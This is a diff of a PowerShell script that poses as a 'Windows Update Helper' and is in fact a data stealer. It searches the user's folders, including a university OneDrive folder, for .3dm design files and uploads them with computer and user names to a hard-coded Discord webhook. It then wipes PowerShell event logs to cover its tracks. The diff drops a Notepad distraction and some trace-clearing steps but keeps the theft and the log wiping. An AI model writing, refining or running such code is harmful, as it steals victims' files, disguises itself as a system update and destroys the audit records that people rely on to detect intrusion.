@@ -1,165 +1,6 @@
 [Console]::BackgroundColor = "Black" 
-[Console]::SetWindowSize(57, 5)
 [Console]::Title = "Windows Update Helper"
 Clear-Host
-
-# Create distraction (Eiffel Tower in Notepad)
-function Show-EiffelTower {
-    $eiffelTower = @"
-                                                        1
-                                                        1
-                                                        1
-                                                        M
-                                                        M
-                                                        M
-                                                        M
-                                                       \M/
-                                                    . ' M ` .
-                                                  \##-#####-##/
-                                                   \# ##### #/
-                                                 ###############
-                                                 ###############
-                                                  \ ! ! ! ! ! /
-                                                   )! ! ! ! !(
-                                                   +---------+
-                                                   +! ! ! ! !+
-                                                   +----*----+
-                                                  +`. .':`. .'+
-                                                  + .^. : .^. +
-                                                  +:...:*:...:+
-                                                  +`. .':`. .'+
-                                                  + .^. : .^. +
-                                                  +:...:*:...:+
-                                                  +`. .':`. .'+
-                                                  +. ^. : .^ .+
-                                                 +:....:*:....:+
-                                                 +` .  ':`  . '+
-                                                 +  .^. : .^.  +
-                                                 +:....:*:....:+
-                                                 +` .. ':` .. '+
-                                                 +. '` .:. '` .+
-                                                 +:....:*:....:+
-                                                 + `. .':`. .' +
-                                                 +   X  :  X   +
-                                                 +.'  `.:.'  `.+
-                                                +:......*......:+
-                                                +`.   .':`.   .'+
-                                                +   X   :   X   +
-                                                + .' `. : .' `. +
-                                                +.......*.......+
-                                                +` . . ':` . . '+
-                                                +   X   :   X   +
-                                                + '   ` : '   ` +
-                                                +../########....+
-                                                +`/#########\ .'+
-                                               +  ############   +
-                                               + '############`  +
-                                               +:.......*.......:+
-                                               + ` .  ' : `  . ' +
-                                               +    X   :   X    +
-                                               + .'   `.:.'   `. +
-                                               +:.......*.......:+
-                                               +`      ':`      '+
-                                              +  `   '  :  `   '  +
-                                              +    X   : :   X    +
-                                              +  '   ` : : '   `  +
-                                              +:.......*.*.......:+
-                                              +`      ': :`      '+
-                                              + `   '  : :  `   ' +
-                                              +   X   : X :   X   +
-                                             +  '   ` :' `: '   `  +
-                                             +:.......*...*.......:+
-                                             +`      ':` ':`      '+
-                                             + `   '  : X :  `   ' +
-                                             +   X   :     :   X   +
-                                             + '   ` :/   \: '   ` +
-                                            +:.......*.....*.......:+
-                                            +`      ':`   ':`      '+
-                                            + `   '  : `.' :  `   ' +
-                                           +    X   :  ' `  :   X    +
-                                           +  '   ` :'     `: '   `  +
-                                           +:.......*.......*.......:+
-                                          + `      ':`     ':`      ' +
-                                          +  ` . '  :  `.'  :  ` . '  +
-                                         +    ' `  :   ' `   :  ' `    +
-                                         +. '    ` : '     ` : '    ` .+
-                                        +..........*.........*..........+
-                                        +  ###########################  +
-                                        +  ###########################  +
-                                       +   ###########################   +
-                                    #########################################
-                                   ###########################################
-                                    \   1   1   1   1   1   1   1   1   1   /
-                                     )  1   1   1   1   1   1   1   1   1  (
-                                     +-----:-----+-------------+-----:-----+
-                                     +     :     +             +     :     +
-                                    *------*-----*-------------*-----*------*
-                                    +XXXXXXXXXXX+XXXXXXXXXXXXXXX+XXXXXXXXXXX+
-                                    *-----*-----*---------------*-----*-----*
-                                   + `.   :  . '+               +` .  :   .' +
-                                   +    . : '   +               +   ` : .    +
-                                  +    . *.    +                 +    .* .    +
-                                  + . '  : `.  +                 +  .' :  ` . +
-                                 *:......*....:*                 *:....*......:*
-                                 + `.   :   . '+                 +` .   :   .' +
-                                +     `.:. '  +                   +  ` .:.'     +
-                                +   . '* `.   +                   +   .' *` .   +
-                               + . '   :    `.+                   +.'    :   ` . +
-                               *:.....*.......*                   *.......*.....:*
-                              +  ` .. :  .. ' +                   + ` ..  : .. '  +
-                              +     . *'     +                     +     `* .     +
-                             +  .. ' :   ` . +                     + . '   : ` ..  +
-                             *.:....*.......:*                     *:.......*....:.*
-                            +   ` ..: . - '  +                     +  ` - . :.. '   +
-                            +    .. * ..    +                       +    .. * ..    +
-                       -------------------------------------------------------------------
-                         1 +:       :      +:       :       :       :+      :       :+ 1
-                         1+ :       :      +:       :       :       :+      :       : +1
-                       ###################################################################
-                        1   1   1   1   1   1   1   1   1   1   1   1   1   1   1   1   1
-                        1   1   1   1   1   1   1   1   1   1   1   1   1   1   1   1   1
-                        +---------------------------------------------------------------+
-                       +! . ! . ! . ! . !+. ! . ! . ! . ! . ! . ! . ! .+! . ! . ! . ! . !+
-                      +:!: :!: :!: :!: :!+ :!: :!: :!: :!: :!: :!: :!: +!: :!: :!: :!: :!:+
-                      +.!.:.!.:.!.:.!.:.!+:.!.:.!.:.!.:.!.:.!.:.!.:.!.:+!.:.!.:.!.:.!.:.!.+
-                     +XXXXXXXXXXXXXXXXXX+\     \  ..-#######-..  /     /+XXXXXXXXXXXXXXXXXX+
-                    *-------------------* \    .-' \  1 1 1  / `-.    / *-------------------*
-                    +  ` .    : ..  '  +   \.-' \   .-------.   / `-./   +  `  .. :    . '  +
-                   +.......:.*:........+ .-' \  .-''         ``-.  / `-. +........:*.:.......+
-                  +    .  '  : ` .    +\:  \  -'                 `-  /  :/+    . ' :  `  .    +
-                  +..:.......:.....:..+/ \ .-'                     `-. / \+..:.....:.......:..+
-                 +    ` .   :    .  ' + \.'                           `./ + `  .    :   . '    +
-                +.........:.*..:.....+  /                               \  +.....:..*.:.........+
-               +     .  '  :   ` .   + /                                 \ +   . '   :  `  .     +
-               +...:......:........:+ /                                   \ +:........:..........+
-              +    `  .  :  .  '    +/                                     \+    `  .  :  .  '    +
-             +...........*.........+                                         +.........*...........+
-            +     .  '  :   `  .   +                                         +   .  '   :  `  .     +
-           +...:.......:.........:+                                           +:.........:.......:...+
-          +    `  .    :   .   '  +                                           +  `   .   :    .  '    +
-         +..........:.*.:........+                                             +........:.*.:..........+
-        +     .   '  :   `  .    +                                             +    .  '   :  `   .     +
-       +...:.........:.........:+                                               +:.........:.........:...+
-      +   `   .     :     .   ' +                                               + `   .     :     .   '   +
-     +...........:.*..:........+                                                 +........:..*.:...........+
-    +      .   '  :   `  .     +                                                 +     .  '   :  `   .      +
-   +...:.........:..........:.+                                                   +.:..........:.........:...+
-  +     `  .     :      .  ' +                                                     + `  .      :     .  '     +
- +            ` *  - '      +                                                       +      ` -  * '            +
------------------------------------------------------------------------------------------------------------------
-"@
-
-    Start-Process notepad
-    Start-Sleep -Milliseconds 500
-    $wshell = New-Object -ComObject wscript.shell
-    Start-Sleep -Milliseconds 500
-    $wshell.AppActivate('Notepad')
-    Start-Sleep -Milliseconds 500
-    $wshell.SendKeys($eiffelTower)
-}
-
-# Start the distraction
-Show-EiffelTower
 
 # Webhook configuration
 $webhookUrl = "https://discord.com/api/webhooks/1340911792490287104/2HeVPsiXhBDRrGWh0eMr9w95fJXriWcCwmY4C87i0cItyUIwjGZ5EP9vg-Nukk3WvkHF"
@@ -174,8 +15,8 @@ $foldersToSearch = @(
     "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
 )
 
-# Create temporary working directory in %TEMP%
-$tempDir = "$env:TEMP\WindowsUpdateCache"
+# Create temporary working directory
+$tempDir = "$env:TEMP\WinUpdateTemp"
 if (-not (Test-Path -Path $tempDir)) {
     New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 }
@@ -191,20 +32,12 @@ function Invoke-Cleanup {
         Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
     }
     
-    # Clear event logs related to PowerShell
+    # Clear event logs
     wevtutil cl "Windows PowerShell" | Out-Null
     wevtutil cl "Microsoft-Windows-PowerShell/Operational" | Out-Null
-    
-    # Clear Run history
-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
-    
-    # Clear prefetch (requires admin)
-    try {
-        Get-ChildItem "$env:SYSTEMROOT\Prefetch\" -Force | Remove-Item -Force -ErrorAction SilentlyContinue
-    } catch {}
 }
 
-# Function to send files to Discord with metadata
+# Function to send files to Discord
 function Send-ToDiscord {
     param (
         [string]$filePath
@@ -213,44 +46,24 @@ function Send-ToDiscord {
     try {
         $fileName = [System.IO.Path]::GetFileName($filePath)
         $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
-        $fileEncoded = [System.Convert]::ToBase64String($fileBytes)
         
-        $body = @{
-            username = "Windows Update Agent"
-            avatar_url = "https://i.imgur.com/7J7WJ7X.png"
-            embeds = @(
-                @{
-                    title = "System Update Scan"
-                    description = "Update compatibility check file found"
-                    color = 3447003
-                    fields = @(
-                        @{
-                            name = "Computer"
-                            value = $env:COMPUTERNAME
-                            inline = $true
-                        },
-                        @{
-                            name = "User"
-                            value = $env:USERNAME
-                            inline = $true
-                        },
-                        @{
-                            name = "File"
-                            value = $fileName
-                            inline = $false
-                        }
-                    )
-                    timestamp = [DateTime]::UtcNow.ToString("o")
-                }
-            )
-            file_data = $fileEncoded
-        } | ConvertTo-Json -Depth 10
+        # Create multipart form content
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $LF = "`r`n"
         
-        $headers = @{
-            "Content-Type" = "application/json"
-        }
-        
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -Headers $headers
+        $body = (
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
+            "Content-Type: application/octet-stream$LF",
+            [System.Text.Encoding]::UTF8.GetString($fileBytes),
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"content`"$LF",
+            "New .3dm file found: $fileName from $env:COMPUTERNAME",
+            "--$boundary--$LF"
+        ) -join $LF
+
+        # Send to Discord
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
     }
     catch {
         # Silent error handling
@@ -273,10 +86,6 @@ try {
     }
 }
 finally {
-    # Always clean up traces
+    # Clean up traces
     Invoke-Cleanup
-    
-    # Close the Notepad window after 30 seconds
-    Start-Sleep -Seconds 30
-    Get-Process notepad -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 }
